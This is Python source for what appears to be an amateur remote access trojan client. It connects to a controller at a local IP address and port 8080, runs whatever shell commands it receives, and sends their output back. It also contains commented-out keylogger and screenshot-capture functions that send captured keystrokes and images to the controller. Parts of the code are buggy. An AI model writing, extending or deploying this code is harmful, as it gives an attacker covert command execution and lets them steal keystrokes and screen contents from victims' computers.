import socket
import os
import subprocess
import time
from threading import Thread
client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect(('192.168.1.243', 8080))
print('connected')
def recieve():
    while True:
            message = client.recv(1024)
            print('message recieved')
            message = message.decode()
            print('message decoded')
            if message == 'keylogger':
                print('keylogger started')
                keylogger()
            if message == 'screenshot':
                print('screenshot started')
                screenshot()
            print(message)
            if not message:
                recieve()
            update = subprocess.check_output(message, shell=True)
            response = update
            client.send(response)
            recieve()
            

'''
def screenshot():
    import pyautogui
    screenshot = pyautogui.screenshot()
    screenshot.save("screen.png")
    myfile = open('screen.png', 'rb')
    g = myfile.read()
    size = len(g)
    f = str(size)
    print(size)
    client.send(f.encode)
    time.sleep(1)
    f = myfile.read(4096)
    #send image to server
    client.send(f)
    print('image sent')
    recieve()
'''

'''
def keylogger():
    from pynput.keyboard import Key, Listener
    import logging
    logging.basicConfig(filename = ("log.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')
    def on_press(key):
        logging.info(str(key))
    with Listener(on_press=on_press) as listener:
                print('this is before listener.join()')
                def log():
                    print('listener.join started')
                    listener.join()
                def other():
                    f = open('log.txt','rb')
                    l = f.read(1024)
                    count = 1
                    count = count + 1
                    lines = f.readlines()
                    content = str(lines)
                    client.send(content.encode())
                    stop = client.recv(1024)
                    command = str(stop.decode())
                    print(command)
                    if command == 'stop':
                        print('stop command issued')
                        pynput.keyboard.Listener.stop()
                        recieve()
                if __name__=='__main__':
                    Thread(target = log).start()
                    Thread(target = other).start()
                    print('threads started')
            
    
'''
recieve()
